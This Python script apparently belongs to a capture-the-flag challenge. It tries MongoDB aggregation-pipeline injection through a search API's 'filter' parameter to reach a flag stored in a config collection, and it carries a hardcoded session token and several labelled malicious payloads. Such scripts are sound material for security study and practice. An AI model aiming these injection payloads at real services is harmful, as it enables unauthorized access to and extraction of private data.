import requests
import json

# Configuration
BASE_URL = "http://chal.competitivecyber.club:3002/"  # Replace with the actual base URL
SEARCH_ENDPOINT = "api/v0/tasks/search"
AUTH_TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiI2NmYwMGRlMGIzYTk4NzgwM2FjYWFjODYiLCJpYXQiOjE3MjcwMDgyMzQsImV4cCI6MTcyNzAxMTgzNH0.2KlmRHrGzSdQ8tCnfwONCn2gj_uL7AFVSjFjPNvgQZk"  # Replace with a valid authentication token

# Headers
headers = {
    "Content-Type": "application/json",
    "Cookie": f"token= {AUTH_TOKEN}"
}

proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080",  # Even though HTTPS is not used, include for completeness
}

# Malicious Payloads

# # Example 1: Inject a $project stage to include all fields and add a constant field
# malicious_filter_project = {
#     "$project": {
#         "*": 1,  # Attempt to include all fields (not a valid operator, used for illustration)
#         "extraField": "InjectedData"
#     }
# }

# Mongo db is like this
# db = db.getSiblingDB('dbog_nom');
# db.createUser({
#     user: "{{MONGO_USER}}",
#     pwd: "{{MONGO_PASSWORD}}",
#     roles: [
#         {
#             role: "readWrite",
#             db: "dbog_nom"
#         }
#     ]
# });

# db.createCollection("config");
# db.createCollection("users");

# db.config.insertOne({
#     value: '{{FLAG}}',
#     type: 'flag'
# })

#ALLOWED_OPERATORS = ["$project", "$group", "$sort", "$addFields", "$expr"];


# Example 2: Use $project with aggregation expressions
malicious_filter_project_expr = {
    "$project": {
        "taskName": 1,
        "extraInfo": {
            "$concat": ["Injected", "Data"]
        }
    }
}

# Example 3: Attempt to induce an error to leak information
malicious_filter_error = {
    "$project": {
        "taskName": 1,
        "errorField": {
            "$invalidOperator": "ThisShouldCauseError"
        }
    }
}

# Example 4: Use $group to aggregate data in an unintended way
malicious_filter_group = {
    "$group": {
        "_id": None,
        "totalTasks": {"$sum": 1},
        "uniqueNames": {"$addToSet": "$taskName"}
    }
}

# Example 5: Use $addFields to manipulate existing fields
malicious_filter_add_fields = {
    "$addFields": {
        "newField": "InjectedValue",
        "combinedField": {"$concat": ["$field1", "$field2"]}
    }
}

# Example 6: Use $facet to run multiple aggregations
malicious_filter_facet = {
    "$facet": {
        "taskInfo": [
            {"$count": "totalTasks"},
            {"$group": {"_id": "$taskName", "count": {"$sum": 1}}}
        ],
        "additionalInfo": [
            {"$addFields": {"injectedField": "InjectedValue"}}
        ]
    }
}

advanced_payload = {
    "$collStats": {
        "collection": "config"
    }
}

payload = {
    "filter": advanced_payload
}

# Choose the payload to use
# Uncomment the desired payload below

# payload = {
#     "filter": malicious_filter_project
# }

# payload = {
#     "filter": malicious_filter_project_expr
# }

# payload = {
#     "filter": malicious_filter_error
# }

# payload = {
#     "filter": malicious_filter_group
# }

# payload = {
#     "filter": malicious_filter_add_fields
# }


def send_exploit(method='POST'):
    url = BASE_URL + SEARCH_ENDPOINT

    try:
        if method.upper() == 'POST':
            response = requests.post(url, headers=headers, json=payload, proxies=proxies)
        elif method.upper() == 'GET':
            # Note: GET requests typically don't have a body. If the server accepts it, use params.
            response = requests.get(url, headers=headers, json=payload, proxies=proxies)
        else:
            print(f"Unsupported HTTP method: {method}")
            return

        print(response.text)
        tasks = response.json()
        print("Exploit Successful! Retrieved Data:")
        print(json.dumps(tasks, indent=2))

        # Attempt to extract any additional fields
        if isinstance(tasks, list):
            for task in tasks:
                for key, value in task.items():
                    if key.startswith("extra") or key.startswith("injected") or key == "flagData":
                        print(f"{key}: {value}")

        
    except requests.exceptions.RequestException as e:
        print(f"An error occurred: {str(e)}")

if __name__ == "__main__":
    print("\nAttempting to send GET request with $facet payload (if POST fails)...")
    send_exploit(method='GET')